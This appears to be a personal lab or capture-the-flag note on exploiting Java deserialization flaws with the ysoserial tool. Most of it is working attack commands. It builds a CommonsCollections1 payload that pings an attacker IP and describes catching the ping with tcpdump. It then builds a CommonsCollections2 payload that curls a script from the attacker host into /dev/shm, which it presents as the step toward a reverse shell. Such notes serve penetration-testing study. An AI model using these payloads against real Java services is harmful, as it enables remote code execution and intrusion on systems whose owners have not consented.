https://github.com/frohoff/ysoserial
We need to download the **latest release jar**

Ysoserial is a programming tool that can be used to exploit Java deserialization vulnerabilities. It consists of modules known as playloads. These playloads generate a serialized object that invokes some action when instantiated, compromising the system or its data.

# Execution

As generally we don't know the type of serialization the victime uses, we try many different payloads, these payloads will serialize the data and the victime will deserialized so the technique must be the same

![[Pasted image 20240402193017.png]] 

In order to guess easily the serialization technique, we can view the error messages if we have them. In this case we see *common* so it's probably using this type of serialization

![[Pasted image 20240403072551.png]]

After installing **ysoserial** we can build our serialized file.

To test at first is advisable to use a ping 
````
java -jar ysoserial-all.jar CommonsCollections1 'ping -c 1 10.10.14.70' > ping.session
````

- CommonsCollections1 is the serialization type that we must change if this doesn't work

If there is a method call issue, we need to explicitly mention the method in our script, if this persist, it's probably due to java version (>12 gives issues for this tool so it's better to downgrade it)
````
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 'ping -c 1 10.10.14.70' > ping.session
````
It creates a file called ping.session. Internally it will deserialized and the response we can catch it by a packet capture tool:
`Attacker$tcpdump -i tun0 icmp -n` *tun0 is the interface*

If this work we can use different scripts to inject and get as reverse shell
````
java -jar ysoserial-all.jar CommonsCollections2 'curl 10.10.14.70 -o /dev/shm/reverse.sh' > pwned.session
````
- Curl stores the script caught from 10.10.40.70 web server (*index.html* file) and the stores it in */deb/shm/*
